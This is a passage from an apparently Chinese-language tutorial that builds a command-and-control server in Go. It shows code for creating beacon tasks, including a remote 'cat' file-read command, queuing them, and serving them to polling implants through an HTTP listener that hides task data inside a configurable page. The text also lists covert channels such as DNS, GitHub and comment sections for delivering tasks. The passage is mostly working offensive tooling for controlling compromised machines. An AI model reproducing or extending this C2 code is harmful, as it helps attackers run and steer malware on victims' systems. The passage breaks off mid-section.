<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> CommandData <span class="keyword">struct</span> &#123;  </span><br><span class="line">    BeaconType <span class="type">string</span>         <span class="string">`json:&quot;beacon_type&quot;`</span>  </span><br><span class="line">    BeaconId   <span class="type">string</span>         <span class="string">`json:&quot;beacon_id&quot;`</span>  </span><br><span class="line">    CmdLine    <span class="type">string</span>         <span class="string">`json:&quot;cmdline&quot;`</span>  </span><br><span class="line">    Data       <span class="keyword">map</span>[<span class="type">string</span>]any <span class="string">`json:&quot;data&quot;`</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>controller/types.go</code> 在TeamServer接口定义BeaconCommand方法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> TeamServer <span class="keyword">interface</span> &#123;  </span><br><span class="line">    ListenerStart(listenerName <span class="type">string</span>, configType <span class="type">string</span>, config request.ConfigDetail) <span class="type">error</span>  </span><br><span class="line">    ListenerGetConfig(listenerName <span class="type">string</span>, configType <span class="type">string</span>) (request.ConfigDetail, <span class="type">error</span>)  </span><br><span class="line">    BeaconGenerate(beaconConfig request.BeaconConfig, listenerConfig request.ConfigDetail) ([]<span class="type">byte</span>, <span class="type">string</span>, <span class="type">error</span>)  </span><br><span class="line">    BeaconCommand(beaconName <span class="type">string</span>, beaconId <span class="type">string</span>, clientName <span class="type">string</span>, cmdline <span class="type">string</span>, args <span class="keyword">map</span>[<span class="type">string</span>]any) <span class="type">error</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为了测试方便可以在Beacon项目中硬编码BeaconId</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/07/31/22-23-38-42f3a96dceeee8097ea74dd840a0b325-20250731222337-826f9c.png"></p>
<p><code>server/beacon.go</code>：实现TeamServer.BeaconCommand方法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(ts *TeamServer)</span></span> BeaconCommand(beaconName <span class="type">string</span>, beaconId <span class="type">string</span>, clientName <span class="type">string</span>, cmdline <span class="type">string</span>, args <span class="keyword">map</span>[<span class="type">string</span>]any) <span class="type">error</span> &#123;  </span><br><span class="line">    value, ok := ts.Beacons.Get(beaconId)  </span><br><span class="line">    <span class="keyword">if</span> !ok &#123;  </span><br><span class="line">       <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;beacon &#x27;%v&#x27; does not exist&quot;</span>, beaconId)  </span><br><span class="line">    &#125;  </span><br><span class="line">    beacon, _ := value.(*Beacon)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> beacon.Active == <span class="literal">false</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;beacon &#x27;%v&#x27; not active&quot;</span>, beaconId)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> ts.Handler.BeaconCommand(clientName, cmdline, beaconName, beacon.Data, args)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handler/beacon.go</code> BeaconCommand，找到相应的beaconHandle处理者</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *Handler)</span></span> BeaconCommand(client <span class="type">string</span>, cmdline <span class="type">string</span>, beaconName <span class="type">string</span>, beaconData response.BeaconData, args <span class="keyword">map</span>[<span class="type">string</span>]any) <span class="type">error</span> &#123;  </span><br><span class="line">    beaconHandler, ok := h.BeaconHandlers[beaconName]  </span><br><span class="line">    <span class="keyword">if</span> !ok &#123;  </span><br><span class="line">       <span class="keyword">return</span> errors.New(<span class="string">&quot;beacon handler not found&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> beaconHandler.BeaconCommand(client, cmdline, beaconData, args)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handler/types.go</code> 在BeaconHandler处理中定义BeaconCommand方法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> BeaconHandler <span class="keyword">interface</span> &#123;  </span><br><span class="line">    BeaconGenerate(beaconConfig request.GenerateConfig, listenerConfig request.ConfigDetail) ([]<span class="type">byte</span>, <span class="type">string</span>, <span class="type">error</span>)  </span><br><span class="line">    BeaconCreate(beat []<span class="type">byte</span>) (response.BeaconData, <span class="type">error</span>)  </span><br><span class="line">    BeaconCommand(client <span class="type">string</span>, cmdline <span class="type">string</span>, beaconData response.BeaconData, args <span class="keyword">map</span>[<span class="type">string</span>]any) <span class="type">error</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handler/beacon/beacon_main.go</code> 实现BeaconHandler.BeaconCommand方法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *BeaconHandler)</span></span> BeaconCommand(client <span class="type">string</span>, cmdline <span class="type">string</span>, beaconData response.BeaconData, args <span class="keyword">map</span>[<span class="type">string</span>]any) <span class="type">error</span> &#123;  </span><br><span class="line">    command, ok := args[<span class="string">&quot;command&quot;</span>].(<span class="type">string</span>)  </span><br><span class="line">    <span class="keyword">if</span> !ok &#123;  </span><br><span class="line">       <span class="keyword">return</span> errors.New(<span class="string">&quot;&#x27;command&#x27; must be set&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    taskData, err := b.CreateTask(beaconData, command, args)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> err  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    b.ts.TaskCreate(beaconData.Id, cmdline, client, taskData)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handler/beacon/types.go</code> 在TeamServer接口处定义TaskCreate方法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> TeamServer <span class="keyword">interface</span> &#123;  </span><br><span class="line">    TaskCreate(beaconId <span class="type">string</span>, cmdline <span class="type">string</span>, client <span class="type">string</span>, taskData response.TaskData)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>utils/response/task.go</code> 定义TaskData结构体</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> response  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">type</span> TaskData <span class="keyword">struct</span> &#123;  </span><br><span class="line">    Type        <span class="type">int</span>    <span class="string">`json:&quot;t_type&quot;`</span>  </span><br><span class="line">    TaskId      <span class="type">string</span> <span class="string">`json:&quot;t_task_id&quot;`</span>  </span><br><span class="line">    BeaconId    <span class="type">string</span> <span class="string">`json:&quot;t_beacon_id&quot;`</span>  </span><br><span class="line">    Client      <span class="type">string</span> <span class="string">`json:&quot;t_client&quot;`</span>  </span><br><span class="line">    User        <span class="type">string</span> <span class="string">`json:&quot;t_user&quot;`</span>  </span><br><span class="line">    Computer    <span class="type">string</span> <span class="string">`json:&quot;t_computer&quot;`</span>  </span><br><span class="line">    StartDate   <span class="type">int64</span>  <span class="string">`json:&quot;t_start_date&quot;`</span>  </span><br><span class="line">    FinishDate  <span class="type">int64</span>  <span class="string">`json:&quot;t_finish_date&quot;`</span>  </span><br><span class="line">    Data        []<span class="type">byte</span> <span class="string">`json:&quot;t_data&quot;`</span>  </span><br><span class="line">    CommandLine <span class="type">string</span> <span class="string">`json:&quot;t_command_line&quot;`</span>  </span><br><span class="line">    MessageType <span class="type">int</span>    <span class="string">`json:&quot;t_message_type&quot;`</span>  </span><br><span class="line">    Message     <span class="type">string</span> <span class="string">`json:&quot;t_message&quot;`</span>  </span><br><span class="line">    ClearText   <span class="type">string</span> <span class="string">`json:&quot;t_clear_text&quot;`</span>  </span><br><span class="line">    Completed   <span class="type">bool</span>   <span class="string">`json:&quot;t_completed&quot;`</span>  </span><br><span class="line">    Sync        <span class="type">bool</span>   <span class="string">`json:&quot;t_sync&quot;`</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handler/beacon/beacon_handler.go</code> 补充CreateTask方法（不完整），主要就是根据命令类型将commandId和一些参数打包在一起。<strong>回答上文的一个疑问</strong>：taskData是原始命令包，是 <code>[]byte</code> 类型的，接下来这个taskData会与其他数据（任务包长度、taskID）再一次打包，形成真正的任务包，如果在 <code>PackArray方法</code> 里打包长度会增加一个长度字段，这个字段是多余的。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *BeaconHandler)</span></span> CreateTask(beacon response.BeaconData, command <span class="type">string</span>, args <span class="keyword">map</span>[<span class="type">string</span>]any) (response.TaskData, <span class="type">error</span>) &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">var</span> (  </span><br><span class="line">       taskData response.TaskData  </span><br><span class="line">       err      <span class="type">error</span>  </span><br><span class="line">    )  </span><br><span class="line">  </span><br><span class="line">    taskData = response.TaskData&#123;  </span><br><span class="line">       Type: TYPE_TASK,  </span><br><span class="line">       Sync: <span class="literal">true</span>,  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">var</span> array []<span class="keyword">interface</span>&#123;&#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">switch</span> command &#123;  </span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;cat&quot;</span>:  </span><br><span class="line">       path, ok := args[<span class="string">&quot;path&quot;</span>].(<span class="type">string</span>)  </span><br><span class="line">       <span class="keyword">if</span> !ok &#123;  </span><br><span class="line">          err = errors.New(<span class="string">&quot;parameter &#x27;path&#x27; must be set&quot;</span>)  </span><br><span class="line">          <span class="keyword">goto</span> RET  </span><br><span class="line">       &#125;  </span><br><span class="line">       array = []<span class="keyword">interface</span>&#123;&#125;&#123;<span class="type">int32</span>(COMMAND_CAT), ConvertUTF8toCp(path, beacon.ACP)&#125;  </span><br><span class="line">    <span class="keyword">default</span>:  </span><br><span class="line">       err = errors.New(fmt.Sprintf(<span class="string">&quot;Command &#x27;%v&#x27; not found&quot;</span>, command))  </span><br><span class="line">       <span class="keyword">goto</span> RET  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    taskData.Data, err = PackArray(array)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">goto</span> RET  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">RET:  </span><br><span class="line">    <span class="keyword">return</span> taskData, err  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handler/beacon/types.go</code>：CommandId常量</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> (  </span><br><span class="line">    COMMAND_CAT = <span class="number">1</span>  </span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><code>handler/beacon/beacon_utils.go</code> 补充ConvertUTF8toCp方法，方法功能是将UTF-8编码的字符串转换成指定 Windows代码页（code page）的编码。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ConvertUTF8toCp</span><span class="params">(input <span class="type">string</span>, codePage <span class="type">int</span>)</span></span> <span class="type">string</span> &#123;  </span><br><span class="line">    enc, exists := codePageMapping[codePage]  </span><br><span class="line">    <span class="keyword">if</span> !exists &#123;  </span><br><span class="line">       <span class="keyword">return</span> input  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    transform.NewWriter(io.Discard, enc.NewEncoder())  </span><br><span class="line">    encodedText, err := io.ReadAll(transform.NewReader(strings.NewReader(input), enc.NewEncoder()))  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> input  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="type">string</span>(encodedText)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>server/task.go</code> 实现TeamServer接口的TaskCreate方法，该方法先校验目标是否在线、补充缺失元数据、生成唯一任务ID，最后把任务塞进对应Beacon的任务队列里。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> server  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> (  </span><br><span class="line">    <span class="string">&quot;OneServer/logs&quot;</span>  </span><br><span class="line">    <span class="string">&quot;OneServer/utils/crypt&quot;</span>    </span><br><span class="line">    <span class="string">&quot;OneServer/utils/response&quot;</span>    </span><br><span class="line">    <span class="string">&quot;fmt&quot;</span>    </span><br><span class="line">    <span class="string">&quot;go.uber.org/zap&quot;</span>    </span><br><span class="line">    <span class="string">&quot;time&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(ts *TeamServer)</span></span> TaskCreate(beaconId <span class="type">string</span>, cmdline <span class="type">string</span>, client <span class="type">string</span>, taskData response.TaskData) &#123;  </span><br><span class="line">    value, ok := ts.Beacons.Get(beaconId)  </span><br><span class="line">    <span class="keyword">if</span> !ok &#123;  </span><br><span class="line">       logs.Logger.Error(<span class="string">&quot;TsTaskCreate: beacon not found&quot;</span>, zap.String(<span class="string">&quot;beaconId&quot;</span>, beaconId))  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    beacon, _ := value.(*Beacon)  </span><br><span class="line">    <span class="keyword">if</span> beacon.Active == <span class="literal">false</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> taskData.TaskId == <span class="string">&quot;&quot;</span> &#123;  </span><br><span class="line">       taskData.TaskId, _ = crypt.GenerateUID(<span class="number">8</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">    taskData.BeaconId = beaconId  </span><br><span class="line">    taskData.CommandLine = cmdline  </span><br><span class="line">    taskData.Client = client  </span><br><span class="line">    taskData.Computer = beacon.Data.Computer  </span><br><span class="line">    taskData.StartDate = time.Now().Unix()  </span><br><span class="line">    <span class="keyword">if</span> taskData.Completed &#123;  </span><br><span class="line">       taskData.FinishDate = taskData.StartDate  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    taskData.User = beacon.Data.Username  </span><br><span class="line">    <span class="keyword">if</span> beacon.Data.Impersonated != <span class="string">&quot;&quot;</span> &#123;  </span><br><span class="line">       taskData.User += fmt.Sprintf(<span class="string">&quot; [%s]&quot;</span>, beacon.Data.Impersonated)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">switch</span> taskData.Type &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">case</span> TYPE_TASK:  </span><br><span class="line">       beacon.TasksQueue.Put(taskData)  </span><br><span class="line">    <span class="keyword">default</span>:  </span><br><span class="line">       <span class="keyword">break</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>utils/crypt/rand.go</code> 根据指定长度生成唯一ID的GenerateUID方法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> crypt  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> (  </span><br><span class="line">    <span class="string">&quot;crypto/rand&quot;</span>  </span><br><span class="line">    <span class="string">&quot;encoding/hex&quot;</span>    </span><br><span class="line">    <span class="string">&quot;fmt&quot;</span>    </span><br><span class="line">    <span class="string">&quot;time&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GenerateUID</span><span class="params">(length <span class="type">int</span>)</span></span> (<span class="type">string</span>, <span class="type">error</span>) &#123;  </span><br><span class="line">    <span class="keyword">if</span> length &lt;= <span class="number">0</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, fmt.Errorf(<span class="string">&quot;length must be greater than 0&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 获取当前时间戳（纳秒级）  </span></span><br><span class="line">    timestamp := time.Now().UnixNano()  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 将时间戳转换为16进制字符串  </span></span><br><span class="line">    timestampHex := fmt.Sprintf(<span class="string">&quot;%x&quot;</span>, timestamp)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 计算还需要多少随机字符  </span></span><br><span class="line">    randomLength := length - <span class="built_in">len</span>(timestampHex)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 如果时间戳部分已经超过了请求的长度，则截断  </span></span><br><span class="line">    <span class="keyword">if</span> randomLength &lt;= <span class="number">0</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> timestampHex[:length], <span class="literal">nil</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 计算需要多少随机字节  </span></span><br><span class="line">    byteLength := randomLength / <span class="number">2</span>  </span><br><span class="line">    <span class="keyword">if</span> randomLength%<span class="number">2</span> != <span class="number">0</span> &#123;  </span><br><span class="line">       byteLength++  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 生成随机字节  </span></span><br><span class="line">    randomBytes := <span class="built_in">make</span>([]<span class="type">byte</span>, byteLength)  </span><br><span class="line">    _, err := rand.Read(randomBytes)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 转换为十六进制字符串  </span></span><br><span class="line">    randomHex := hex.EncodeToString(randomBytes)[:randomLength]  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 拼接时间戳和随机部分  </span></span><br><span class="line">    result := timestampHex + randomHex  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 确保长度正确  </span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(result) &gt; length &#123;  </span><br><span class="line">       result = result[:length]  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> result, <span class="literal">nil</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>server/types.go</code> 补充任务类型常量，本项目中只有 <code>TYPE_TASK</code> 类型的任务</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> (  </span><br><span class="line">    TYPE_TASK       = <span class="number">1</span>  </span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h2 id="5-2-任务获取"><a href="#5-2-任务获取" class="headerlink" title="5.2 任务获取"></a>5.2 任务获取</h2><p>本项目中通过HTTP POST 不断的轮询向服务器请求任务，轮询就是一个死循环，然后在循环体里不断发送任务请求，等待服务器响应，解析响应走入不同的处理分支。任务还可以从DNS、SMB、TCP socket、WebSocket，grpc等协议通信获取，甚至github，百度网盘，评论区等可以留存文本信息且能读取的网站中获取，它们的优劣就看各位师傅使用的场景，我就不在这里长篇大论了。</p>
<p><strong>这一小节只编写Server端的相关代码</strong></p>
<p><code>handler/listener/http_listener.go</code> processRequest补充“<strong>获取任务</strong>”和“<strong>替换payload存放的位置</strong>”的相关代码</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(handler *HTTP)</span></span> processRequest(ctx *gin.Context) &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 校验请求合法性  </span></span><br><span class="line">    err := handler.validate(ctx)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 获取外部 IP    </span></span><br><span class="line">    externalIP := strings.Split(ctx.Request.RemoteAddr, <span class="string">&quot;:&quot;</span>)[<span class="number">0</span>]  </span><br><span class="line">    <span class="keyword">if</span> handler.Config.XForwardedFor &#123;  </span><br><span class="line">       xff := ctx.Request.Header.Get(<span class="string">&quot;X-Forwarded-For&quot;</span>)  </span><br><span class="line">       <span class="keyword">if</span> xff != <span class="string">&quot;&quot;</span> &#123;  </span><br><span class="line">          externalIP = xff  </span><br><span class="line">       &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    beaconId, beat, err := handler.parseBeat(ctx)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       handler.pageError(ctx)  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> !listenerHTTP.ts.BeaconIsExists(beaconId) &#123;  </span><br><span class="line">       <span class="keyword">if</span> err := listenerHTTP.ts.BeaconCreate(beaconId, beat, handler.Name, externalIP, <span class="literal">true</span>); err != <span class="literal">nil</span> &#123;  </span><br><span class="line">          handler.pageError(ctx)  </span><br><span class="line">          <span class="keyword">return</span>  </span><br><span class="line">       &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    responseData, err := listenerHTTP.ts.BeaconGetAllTasks(beaconId, <span class="number">0x1900000</span>) <span class="comment">// 25 Mb  </span></span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       handler.pageError(ctx)  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    html := []<span class="type">byte</span>(strings.ReplaceAll(handler.Config.PagePayload, <span class="string">&quot;&lt;&lt;&lt;PAYLOAD_DATA&gt;&gt;&gt;&quot;</span>, <span class="type">string</span>(responseData)))  </span><br><span class="line">    <span class="keyword">if</span> _, err := ctx.Writer.Write(html); err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       handler.pageError(ctx)  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    ctx.AbortWithStatus(http.StatusOK)  </span><br><span class="line">    <span class="keyword">return</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handler/listener/http_type.go</code> TeamServer接口定义BeaconGetAllTasks方法</p>
